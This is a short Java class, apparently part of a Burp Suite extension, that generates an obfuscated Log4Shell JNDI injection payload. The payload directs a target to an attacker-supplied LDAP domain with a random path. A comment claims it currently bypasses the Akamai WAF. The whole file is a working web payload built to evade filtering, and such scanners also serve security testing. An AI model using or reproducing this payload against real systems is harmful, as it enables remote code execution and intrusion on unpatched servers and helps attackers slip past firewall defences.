package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

//Currently bypass Akamai waf?    12/17

public class POC14 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${ksss8s:k5:-${JNDi${}:ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 14;
    }
}
